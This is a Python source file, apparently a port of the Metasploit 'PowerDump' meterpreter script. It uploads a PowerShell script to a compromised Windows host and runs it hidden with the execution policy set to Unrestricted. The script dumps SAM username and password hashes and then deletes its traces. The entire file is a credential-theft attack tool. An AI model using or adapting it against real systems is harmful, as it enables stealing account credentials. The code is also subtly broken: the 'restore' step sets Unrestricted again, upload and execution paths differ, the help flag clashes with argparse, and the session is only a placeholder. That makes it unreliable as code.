#!/usr/bin/env python3
##
# WARNING: Metasploit no longer maintains or accepts meterpreter scripts.
# If you'd like to improve this script, please try to port it as a post
# module instead. Thank you.
##

"""
Meterpreter script for utilizing purely PowerShell to extract username and password hashes through registry
keys. This script requires you to be running as system in order to work properly. This has currently been
tested on Server 2008 and Windows 7, which install PowerShell by default.

Script and code written by: Kathy Peters, Joshua Kelley (winfang), and David Kennedy (rel1k)

Special thanks to Carlos Perez for the template from GetCounterMeasures.rb

Script version 0.0.1
"""

import argparse
import os
import random
import time
import sys

# NOTE: This would need actual framework initialization in a real implementation
# Placeholder for Meterpreter session
session = None


def usage():
    """Display usage information"""
    print("PowerDump -- Dumping the SAM database through PowerShell")
    print("Dump username and password hashes on systems that have")
    print("PowerShell installed on the system. Win7 and 2008 tested.")
    sys.exit(0)


def dumphash(session):
    """Actual Hashdump here"""
    
    # NOTE: In real implementation, would use Msf::Config.data_directory
    path = os.path.join("data", "exploits", "powershell")
    
    print("[*] Running PowerDump to extract Username and Password Hashes...")
    filename = f"{random.randint(0, 99999)}.ps1"
    hash_dump = f"{random.randint(0, 99999)}"
    
    session.fs.file.upload_file(f"%TEMP%\\{filename}", os.path.join(path, "powerdump.ps1"))
    print(f"[*] Uploaded PowerDump as {filename} to %TEMP%...")
    
    print("[*] Setting ExecutionPolicy to Unrestricted...")
    session.sys.process.execute("powershell Set-ExecutionPolicy Unrestricted", None, {'Hidden': 'true', 'Channelized': True})
    
    print("[*] Dumping the SAM database through PowerShell...")
    session.sys.process.execute(f"powershell C:\\Windows\\Temp\\{filename} >> C:\\Windows\\Temp\\{hash_dump}", None, {'Hidden': 'true', 'Channelized': True})
    
    time.sleep(10)
    
    hashes = session.fs.file.new(f"%TEMP%\\{hash_dump}", "rb")
    try:
        while True:
            data = hashes.read()
            if data is None:
                break
            data = data.strip()
            print(data)
    except EOFError:
        pass
    finally:
        hashes.close()
    
    print("[*] Setting Execution policy back to Restricted...")
    session.sys.process.execute("powershell Set-ExecutionPolicy Unrestricted", None, {'Hidden': 'true', 'Channelized': True})
    
    print("[*] Cleaning up after ourselves...")
    session.sys.process.execute(f"cmd /c del %TEMP%\\{filename}", None, {'Hidden': 'true', 'Channelized': True})
    session.sys.process.execute(f"cmd /c del %TEMP%\\{hash_dump}", None, {'Hidden': 'true', 'Channelized': True})


def main():
    parser = argparse.ArgumentParser(
        description="PowerDump v0.1 - PowerDump to extract Username and Password Hashes..."
    )
    parser.add_argument(
        "-h", "--help", action="help", help="Help menu."
    )
    
    args = parser.parse_args()
    
    if session is None:
        print("[-] No active session")
        sys.exit(1)
    
    print("[*] PowerDump v0.1 - PowerDump to extract Username and Password Hashes...")
    dumphash(session)


if __name__ == "__main__":
    main()
